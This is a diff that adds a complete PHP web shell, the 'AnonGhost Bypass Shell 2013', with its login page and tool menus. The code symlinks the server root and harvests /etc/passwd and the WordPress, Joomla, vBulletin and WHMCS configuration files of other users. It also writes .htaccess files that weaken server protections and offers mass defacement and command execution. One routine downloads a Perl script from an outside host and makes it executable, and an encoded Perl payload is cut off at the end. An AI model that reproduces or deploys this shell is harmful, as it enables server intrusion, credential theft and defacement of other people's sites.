@@ -1,0 +1,1810 @@
+<?php
+##################################
+#   AnonGhost Bypass Shell 2013  #
+#       Coded by Virusa Worm     #
+##################################
+error_reporting(0);
+@set_time_limit(0);
+@session_start();
+$xSoftware = trim(getenv("SERVER_SOFTWARE"));
+$xServerName = $_SERVER["HTTP_HOST"];
+$xName = "Virusa Worm";
+$mlebu = "a6df8bf9aabd07789c1772de31ebbbde"; 
+$jajal = (md5($_POST['pass']));
+$rasane = 1; 
+if($jajal == $mlebu){
+	$_SESSION['login'] = "$jajal";
+}
+if($rasane){
+	if(!isset($_SESSION['login']) or $_SESSION['login'] != $mlebu){
+		die("
+		
+<html>
+  <head>
+    <title>AnonGhost Bypass Shell 2013</title><link rel=\"shortcut icon\" href=\"http://www.iconj.com/ico/2/j/2j62fbaa2w.ico\" type=\"image/x-icon\" />
+    <style type=\"text/css\">
+	body { background-color:#151515; color: rgb(0, 153, 0); }
+	input{ margin:0;	background-color:#151515; border:0px solid #151515; position:relative; bottom:75px; left:300pt;}
+	input, select, textarea{ color: #151515; } textarea:focus, input:focus { color: #151515; }
+	.fot{ font-family:Tahoma, Arial, sans-serif; color: #009900 ; font-size: 11pt; }
+.cont a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 16px; text-shadow: 0px 0px 3px ; }
+.cont a:hover{ color: #FF0000 ; text-shadow:0px 0px 3px #ff0000 ;} 
+#menu a{ padding: 1px; border: 1px solid green; color: green; text-decoration: none;color: #009900; font-family: Tahoma, Geneva, sans-serif; font-size:12px; }
+#menu a:hover{ border: 1px solid red; color: red; }
+    </style>
+     </head><script> function myFunction() {alert(\"Please Login First..!\"); }</script>
+  <body>
+  <center><img src=\"http://i952.photobucket.com/albums/ae1/virusaworm/ag_zps0e71aa70.jpg\" /></center><br><div id=\"menu\" class=\"cont\" align=\"center\">
+<a href=\"\" onclick=\"myFunction()\">&nbsp;Home&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Symlink&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Bypass&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Mass&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Tools&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Upload&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;About&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Logout&nbsp;</a> <a href=\"\" onclick=\"myFunction()\">&nbsp;Kill&nbsp;</a><hr color=#\"006600\" width=\"32%\" /></div> 
+<br><br><br><center><img src=\"http://i952.photobucket.com/albums/ae1/virusaworm/agh_zps2f4dd68b.jpg\" />
+<br><br><font color=\"#006600\" size=\"1pt\">Coded by </font><font  color=\"#00aa00\" size=\"1pt\">Virusa Worm</font> <font color=\"#b0b000\" size=\"1pt\">-</font> <font color=\"#006600\" size=\"1pt\">Idea by </font><font color=\"#009900\" size=\"1pt\">Mauritania Attacker</font><br><br><font color=\"#00aa00\" size=\"1pt\">AnonGhost Bypass </font><font face=\"Tahoma\" color=\"#b3b3b3\" size=\"1pt\">Shell 2013</font> <font color=\"#006600\" size=\"1pt\">include Several script which has recoded to make this shell.</font><br><br><font color=\"#006600\" size=\"1pt\">so.. try to figure it out if this shell not work in different server, and use ur brain.<br>learn to figure it out about something it\'s make be better. mbuh ngomong opo iki.. lol..<br>yen ono seng salah yo tulong dibenerke, tapi yen bener yo ojo disalahke.. kan iso sinau bareng.. wkkwk..<br><br><font color=\"#b0b000\" size=\"1pt\">\"</font>tools not make hacker, but try to learn about tools. tried to find out why it's tool works. it's will be better than nothing.. <font color=\"#b0b000\" size=\"1pt\">\"</font><br><br><br><br><br><font color=\"#006600\" size=\"1pt\">Special thankz to : </font><br><font color=\"#009900\" size=\"1pt\">My best Brother Mauritania Attacker<br><br><br><br><font color=\"#006600\" size=\"1pt\">thankz to : </font><br>
+All Members AnonGhost Team - <font color=\"#006600\" size=\"1pt\">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color=\"#006600\" size=\"1pt\">[pasangan galo.. lol..]]</font><br><br>Greetz to :</font><br><font color=\"#b0b000\" size=\"1pt\">AnonGhost - Mauritania HaCker Team - X-Blackerz INC - ZHC - All Muslim Hackers</font><font color=\"#006600\" size=\"1pt\"></center><br><br><center><form method=\"post\"><input type=\"password\" name=\"pass\"></form></center>
+	  <footer id=\"det\" style=\"position:fixed; left:0px; right:0px; bottom:0px; background:rgb(21,21,21); text-align:center; border-top: 1px solid #009900; border-bottom: 1px solid #009900\"><font color=#009900 size=1 face=\"Tahoma\">&copy; AnonGhost Bypass Shell 2013 - Coded by Virusa Worm</font></footer>
+  </body>
+</html>
+            ");
+    }
+}
+
+$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+$u = explode("/",$pageURL );
+$pageURL =str_replace($u[count($u)-1],"",$pageURL );
+
+$pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
+$u = explode("/",$pageFTP );
+$pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
+
+function checkAlexa($domain)
+{
+    $clean = explode("/", $domain);
+    $result = file_get_contents("http://data.alexa.com/data?cli=10&dat=snbamz&url=http://" . $clean[0]);
+    $n      = explode("<POPULARITY URL=\"" . $clean[0] . "/\" TEXT=\"", $result);
+    @$rest = $n[1];
+    $it         = explode("\"", $rest);
+    $alexa_rank = $it[0];
+    if (@$alexa_rank != "") {
+        return number_format($alexa_rank);
+    } else {
+        return "No Alexa";
+    }
+}
+
+?>
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<title>AnonGhost Bypass Shell 2013</title><link rel="shortcut icon" href="http://www.iconj.com/ico/2/j/2j62fbaa2w.ico" type="image/x-icon" />
+
+<style type="text/css">
+  html,body { margin: 0; padding: 0; outline: 0; }
+a{ font-size: 12px; }
+body { direction: ltr;  background-color:#151515; color: rgb(0, 153, 0); text-align: center } input,textarea,select{ font-weight: bold; color: #000000; }
+input,textarea,select:hover{ box-shadow: 0px 0px 4px #00cc00; }
+.hedr { font-family: Tahoma, Arial, sans-serif  ;  font-size: 22px; } 
+.cont a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 16px; text-shadow: 0px 0px 3px ; }
+.cont a:hover{ color: #FF0000 ;  text-shadow:0px 0px 3px #ff0000 ; }
+.cone a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 12px; text-shadow: 0px 0px 3px ; }
+.cone a:hover{ color: #FF0000 ; text-shadow:0px 0px 3px #ff0000 ; }
+.tmp tr td{ border: solid 1px #006600; padding: 2px ; font-size: 13px; }
+.tmp tr td a { text-decoration: none; }
+.foter{ font-size: 9pt; color: #006600 ; text-align: center }
+.tmp tr td:hover{ box-shadow: 0px 0px 4px #00cc00; }
+.fot{ font-family:Tahoma, Arial, sans-serif; color: #009900 ; font-size: 11pt; }
+.for a : hover{ color: #FF0000 ; text-shadow: 0px 0px 1px #FF0000; }
+.ir { color: #FF0000; }
+.tul { face:Tahoma, Geneva, sans-serif; font-size: 7pt; }
+#menu a{ padding: 1px; border: 1px solid green; color: green; text-decoration: none;color: #009900; font-family: Tahoma, Geneva, sans-serif; font-size:12px; }
+#menu a:hover{ border: 1px solid red; color: red; }
+
+</style>
+
+</head>
+
+<body>
+
+<div class='all'>
+
+
+<?php
+
+@mkdir('sim',0777);
+$htcs  = "Options all
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy Any";
+$f =@fopen ('sim/.htaccess','w');
+fwrite($f , $htcs);
+
+
+
+@symlink("/","sim/rut");
+
+$pg = basename('index.php');
+
+echo '<center>'.base64_decode("PGltZyBzcmM9Imh0dHA6Ly9pOTUyLnBob3RvYnVja2V0LmNvbS9hbGJ1bXMvYWUxL3ZpcnVzYXdvcm0vYWdfenBzMGU3MWFhNzAuanBnIiAvPg==").'</center>' ;
+
+echo '<div id="menu" class="cont" align="center">
+<a href="?">&nbsp;Home&nbsp;</a>
+<a href="?vw=sime">&nbsp;Symlink&nbsp;</a>
+<a href="?vw=baipas">&nbsp;Bypass&nbsp;</a>
+<a href="?vw=mase">&nbsp;Mass&nbsp;</a>
+<a href="?vw=tule">&nbsp;Tools&nbsp;</a>
+<a href="?vw=aplot">&nbsp;Upload&nbsp;</a>
+<a href="?vw=abot">&nbsp;About&nbsp;</a>
+<a href="?vw=metu">&nbsp;Logout&nbsp;</a>
+<a href="?vw=mati">&nbsp;Kill&nbsp;</a>
+</div>
+
+<div class="tul"><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">
+';
+echo '<hr color=#"006600" width="75%">';
+if(ini_get('safe_mode') == '1'){
+echo '<font color="#006600"> Safe mode:</font><b class="tul"><font color="red"> ON&nbsp;</font></font></b>|';
+}
+else{
+echo '<font color="#006600"> Safe mode:</font><b class="tul"><font color="00bb00"> OFF&nbsp;</font></b>|';
+}
+if(ini_get('magic_quotes_gpc') == '1'){
+echo '<font color="#006600"> Magic_quotes_gpc:</font><b class="tul"><font color="red"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Magic_quotes_gpc:</font><b class="tul"><font color="00bb00"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('mysql_connect')){
+echo '<font color="#006600"> Mysql:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Mysql:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('mssql_connect')){
+echo '<font color="#006600"> Mssql:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Mssql:</font><b class="tul"><font color="b0b000"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('pg_connect')){
+echo '<font color="#006600"> PostgreSQL:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> PostgreSQL:</font><b class="tul"><font color="b0b000"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('ocilogon')){
+echo '<font color="#006600"> Oracle:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Oracle:</font><b class="tul"><font color="b0b000"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('curl_version')){
+echo '<font color="#006600"> Curl:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Curl:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('exec')){
+echo '<font color="#006600"> Exec:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Exec:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+if(!ini_get('open_basedir') != "on"){
+echo '<font color="#006600"> Open_basedir:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Open_basedir:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+if(!ini_get('ini_restore') != "on"){
+echo '<font color="#006600"> Ini_restore:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Ini_restore:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+if(function_exists('symlink')){
+echo '<font color="#006600"> Symlink:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Symlink:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+if(function_exists('file_get_contents')){
+echo '<font color="#006600"> file_get_contents:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> file_get_contents:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>|';
+}
+if(is_dir('sim/rut')){
+echo '<font color="#006600"> Permission:</font><b class="tul"><font color="00bb00"> ON&nbsp;</font></b>|';
+}
+else{
+echo '<font color="#006600"> Permission:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>';
+}
+echo '<hr color=#"006600" width="75%"></div>';
+
+if(isset($_REQUEST['vw']))
+{
+switch ($_REQUEST['vw'])
+{
+case 'dose':
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Domains Script</font></b><br><br>';
+if(!@is_file('named.txt')){
+$d00m = @file("/etc/named.conf");
+}else{
+$d00m = @file("named.txt");
+}
+if(!$d00m)
+{
+                die ("<meta http-equiv='refresh' content='0; url=?vw=read'/>");
+}
+else
+{
+echo "<div class='tmp'>
+<table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>Script</b></font> </td>";
+foreach($d00m as $dom){
+flush();
+flush();
+if(eregi("zone",$dom)){
+@preg_match_all('#zone "(.*)"#', $dom, $domvw);
+flush();
+if(@strlen(trim($domvw[1][0])) > 2){
+$user = @posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));
+$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp-config.php";
+$wpp=@get_headers($wpl);
+$wp=$wpp[0];
+$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/wp-config.php";
+$wpp2=@get_headers($wp2);
+$wp12=$wpp2[0];
+$jo1=$pageURL."/sim/rut/home/".$user['name']."/public_html/configuration.php";
+$joo=@get_headers($jo1);
+$jo=$joo[0];
+$jo2=$pageURL."/sim/rut/home/".$user['name']."/public_html/joomla/configuration.php";
+$joo2=@get_headers($jo2);
+$jo12=$joo2[0];
+$vb1=$pageURL."/sim/rut/home/".$user['name']."/public_html/includes/config.php";
+$vbb=@get_headers($vb1);
+$vb=$vbb[0];
+$vb2=$pageURL."/sim/rut/home/".$user['name']."/public_html/vb/includes/config.php";
+$vbb2=@get_headers($vb2);
+$vb12=$vbb2[0];
+$vb3=$pageURL."/sim/rut/home/".$user['name']."/public_html/forum/includes/config.php";
+$vbb3=@get_headers($vb3);
+$vb13=$vbb3[0];
+$wh1=$pageURL."/sim/rut/home/".$user['name']."public_html/clients/configuration.php";
+$whh2= @get_headers($wh1);
+$wh=$whh2[0];
+$wh2=$pageURL."/sim/rut/home/".$user['name']."/public_html/support/configuration.php";
+$whh2= @get_headers($wh2);
+$wh12=$whh2[0];
+$wh3=$pageURL."/sim/rut/home/".$user['name']."/public_html/client/configuration.php";
+$whh3= @get_headers($wh3);
+$wh13=$whh3[0];
+$wh5=$pageURL."/sim/rut/home/".$user['name']."/public_html/submitticket.php";
+$whh5= @get_headers($wh5);
+$wh15=$whh5[0];
+$wh4=$pageURL."/sim/rut/home/".$user['name']."/public_html/client/configuration.php";
+$whh4= @get_headers($wh4);
+$wh14=$whh4[0];
+$pos = strpos($wp, "200");
+$config="&nbsp;";
+
+if (strpos($wp, "200") == true )
+{
+ $config="<div class='cone'><a href='".$wpl."' target='_blank'>Wordpress</a></div>";
+}
+elseif (strpos($wp12, "200") == true)
+{
+  $config="<div class='cone'><a href='".$wp2."' target='_blank'>Wordpress</a></div>";
+}
+
+elseif (strpos($jo, "200")  == true and strpos($wh15, "200")  == true )
+{
+  $config=" <div class='cone'><a href='".$wh5."' target='_blank'>WHMCS</a></div>";
+
+}
+elseif (strpos($wh12, "200")  == true)
+{
+  $config ="<div class='cone'> <a href='".$wh2."' target='_blank'>WHMCS</a></div>";
+}
+
+elseif (strpos($wh13, "200")  == true)
+{
+  $config ="<div class='cone'> <a href='".$wh3."' target='_blank'>WHMCS</a></div>";
+
+}
+
+elseif (strpos($jo, "200")  == true)
+{
+  $config=" <div class='cone'><a href='".$jo1."' target='_blank'>Joomla</a></div>";
+}
+
+elseif (strpos($jo12, "200")  == true)
+{
+  $config=" <div class='cone'><a href='".$jo2."' target='_blank'>Joomla</a></div>";
+}
+
+elseif (strpos($vb, "200")  == true)
+{
+  $config=" <div class='cone'><a href='".$vb1."' target='_blank'>vBulletin</a></div>";
+}
+
+elseif (strpos($vb12, "200")  == true)
+{
+  $config=" <div class='cone'><a href='".$vb2."' target='_blank'>vBulletin</a></div>";
+}
+
+elseif (strpos($vb13, "200")  == true)
+{
+  $config=" <div class='cone'><a href='".$vb3."' target='_blank'>vBulletin</a></div>";
+}
+
+else
+{
+ continue;
+}
+flush();
+flush();
+
+
+$site = $user['name'] ;
+
+
+
+flush();
+
+echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0]."/>".$domvw[1][0]."</a></div></td>
+<td><div class='cone'>".$config."</div></td></tr>"; flush();
+
+}
+}
+}
+}
+echo "</table></div><br><br>";
+break;
+case 'sime':
+echo '<br><br><br><br><b class="cont" align="center">
+<a href="?vw=sym">Symlink Server</a><br><br>
+<a href="?vw=dose">Domains Script</a><br><br>
+<a href="?vw=vkill">Perl based symlink</a><br><br>
+<a href="?vw=file">Symlink Manual</a><br><br>
+<a href="?vw=ensim">Enable Symlink</a></b><br>';
+break;
+
+case 'baipas':
+echo '<br><br><br><br><b class="cont" align="center">
+<a href="?vw=passwd">Bypass /etc/passwd</a><br><br>
+<a href="?vw=cgipl">Bypassed Perl Security</a><br><br>
+<a href="?vw=bforb">Bypass Forbidden</a><br><br>
+<a href="?vw=posget">Bypass posix_getpwuid</a><br><br>
+<a href="?vw=suphp">Bypass SuPHP</a><br><br>
+<a href="?vw=ssi">Ssi Bypasser</a><br><br>
+</b>';
+break;
+case 'mase':
+echo '<br><br><br><br><b class="cont" align="center">
+<a href="?vw=joomla">Mass Joomla</a><br><br>
+<a href="?vw=masde">Mass Deface</a><br><br>
+<a href="?vw=vb">Mass vBulletin</a><br><br>
+<a href="?vw=wp">Mass WordPress</a></b>';
+break;
+case 'tule':
+echo '<br><br><br><br><b class="cont" align="center">
+<a href="?vw=cmd">Command Execution</a><br><br>
+
+<a href="?vw=vgrab">Config Grabber</a><br><br>
+<a href="?vw=cari">Find Directory Writable/Readable</a><br><br>
+
+</b>';
+
+
+break;
+
+case 'cari':
+
+echo '<center /><br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Find Directory Writable/Readable</b></p><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>
+
+"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd
+
+</center>"; exit;} $path_to_public=array(); echo "<html><center><font color='#009900' size='2pt' />
+
+"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>
+
+";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>
+
+"; }}} echo "<font color=red size=2pt>[+]</font> <font color=#009900 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#009900 size=2pt>readable public_html directories.</font><br><br>
+
+
+"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=red size=2pt>[+]</font> <font color=#009900 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#009900 size=2pt>writable directories.</font>
+
+"; echo "</center></html>";
+}
+
+break;
+
+
+case 'cgipl':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Bypassed Perl Security</b>';
+echo '<center><form method=post><br><br>
+            <input type=submit name=su value="Bypass" /></form></center>';
+          
+            error_reporting(0);
+            
+            if(isset($_POST['su']))
+            {
+            mkdir('wper',0755);
+    $rr  = " Options +ExecCGI
+	AddType application/x-httpd-cgi .sh
+	AddHandler mod_python .sh
+	AddHandler mod_perl .sh
+	AddHandler cgi-script .sh
+	AddType application/x-httpd-cgi .pl
+	AddHandler cgi-script .pl
+	AddHandler cgi-script .pl ";
+    $g = fopen('wper/.htaccess','w');
+    fwrite($g,$rr);
+  
+    $wper = symlink("/","wper/vw.pl");            
+    mkdir('wper',0755);
+    $file = file_get_contents('http://www.medico.org/language/en-GB/en-GB.tpl.txt');
+    $g = fopen('wper/vw.pl', 'w');
+    fwrite($g,$file);
+    fclose($g);
+	chmod("vw.pl",0755);
+    $wper = symlink("/","wper/vw.pl");
+            fwrite($f,$r);
+            $consym="<b class='cont' align='center'><a href=wper/vw.pl target='_blank'><font color=#ff0000 size=2 face=\"Courier New\">Click here to open</font></a></b><br>";
+            echo "<center><br><br>Perl Bypassed Successfully<br><br><font color=#58FAF4 size=2 face=\"Courier New\">$consym</font></center>";
+           
+}
+
+break;
+
+case 'vgrab':
+
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Configs Grabber</b>";?><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#009900" size="2pt">/etc/passwd content</p><form method="POST"><textarea name="passwd" class='output' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="Fvck'em!" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('vwconfig', 0755);@chdir('vwconfig');$htaccess="
+Options all
+Options +Indexes
+Options +FollowSymLinks
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None 
+Satisfy Any
+";file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("
+",$passwd);echo "<br><br><center><font color=#009900 size=2pt>wait ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" color="#009900" size="2pt">Done -> <a target="_blank" href="vwconfig">Open configs</a></font></b>';}
+
+break;
+case 'vkill':
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Perl based symlink</font></b><br><br>
+<div align=center><table width=100% border=0><tr><td align=center></td></tr></table>
+<font face="Tahoma" color="#009900" size="2pt">Extract /etc/passwd</font></b><br><br><form method=post>
+	<input type=submit name=passx value="Extract"><p></form>';
+	
+if(isset($_POST['passx']))
+{
+	
+echo '<textarea rows=20 cols=50 name=usernames  >';
+$users=file("/etc/passwd");
+foreach($users as $user)
+{
+$str=explode("
+",$user);
+echo $str[0]."
+";
+}
+
+
+echo '</textarea>';
+ 
+}
+
+	echo '<form method=post>
+	<font face="Tahoma" color="#009900" size="2pt"><input type=submit name=perl value="Perl based  ln -s"></font></form>
+	<p>';
+
+if(isset($_POST['perl']))
+{
+	error_reporting(0);
+
+$vw='tZp7c+I4EsD/T1W+g1bJDXATI0h254aHubnLYyd1eW3Cbm5uZyvlhwAv8mMsOZBJsZ/91LJNIJPYyHtXJGDUrZ9ardYDu3e+IwmPie0FJKIxQ8ap+s5Cx2LEtgLX94LtrSj2AoHwYRgIGghDPES0iwSdCzIRPvscfA5wL9Oq9b87ujwcfro6RiBDVz//8+z0EGGDkNuDQ0KOhkfo3x+H52eo3WyhYWwF3BNeGMjmyPEFRngiRNQlZDabNWcHzTAek+E1mQOrDZWzS0Os1Gy6wsWD7a2+anHus4CbL3DanU4nrZ4qU8uFT58KC4G2Qb8k3r257OaZFYwTa0wxctISE9PASDhGpLDeULpnpc7STz3kTKyYU2EmYmS8zzDCE4wOZN2RN+boXx5jNO6TtLTPvGCKYspMzCdhLJxEIE+CMZrEdLTWRyj+vemEPpFXxCEJcZK27Udjuz0FIUYwaib2fNkjMjdSjLKAiwdGM7Ey1uEcPNS8n6HH7a2R7IgxsnyPPXTR0JqEvtXLSrn3VQZCez+a5yUz6o0noovskLmyzAlZGHfRTqvV6bRasgD4hsW8cdBFjnQPjfNCPrHccCZrMsuZolY0V/8perG9teNMqDMNEwHKVkwtMG17yw5jl8oWeMg8F7VlDdnWu3etFghltT5RvYNukmzAaxLIExsxj0lEfTfhNG4gE324k4Jdn8fy+sv8MZq5CyiYhswyobiJCW4q7WXxH5x8DggZA/HBh8Gq14h0ECW1VLNZI1FiM8+5gwAgXuCwxKWcOGq4k5g2o0lU21O0Zk36IIyaYi5qjU2JId8IaoRcl6tCqQSttCqAfRo7dDO6Uq3aBNdoQ9NB4NWNXL+vz428YLzZsObamm1YrNz7oKSHtXzq2zTOgE3ZwDoxk+tBS2Ca3k0rPfXZgg1kHZypVLJyDaRp2iiMk29m3DpRqVSg8g2wmh224GCgaOusH6pinhv1vR5oFhkvUWZR+0AXVMSSb3q426tC3O2VtnW2PHaUmGiAjh64lKqPjGLKeSFTaWg6QO735eClluZgbQS/rQZ/srx8BHPVCl4P6KzYfFDQRpYRNYONhePXiQaI/5fRW2U6SBN4iYmaXlSi14kg1p1fobAKVj4jVdA8GniiyEoQa+64llzgXweCWA8oKBcFQBDr7913Yxba0ldrtHd6nGyPJa69jvmbtjkBdcQ6472m06d3327NnWrdecnPbc2zze9h6DOr6NSVauxXmgGl2EozQVYtIWuOq883sNTRPYipCVvOrThxy8H6E1jtUOXgavvURtwKC3c5V38Bv7eLz+X3ti7voAx4UGkNeJmWC7XtnE38In9KcVvzZwTcSYqLVwJJNTI1fWvlv8PL6EpJn3378fzwpoytlLTZDsBL0A6w9cll3tD1BE+iKIxFETVT0eeWQTWJ1EliWswEjUrUkqmRksG/VenFA/fE1x0/J7ICWjgBUw3NDb4MWoE5CXlhmIFcnwh37Eqg2rfpoBIvo1a6UVWwj+lOL9v3hPCcKRUvrAGa5zmHeXKFLuxyplKFW46tQqUbmEsr2Uv/PwZvsNKuKWr+cPYYK5kLmYruaTSA51Yl22SqpUl+KKU+6BLVw4FSqv7TnuV5zPW4MF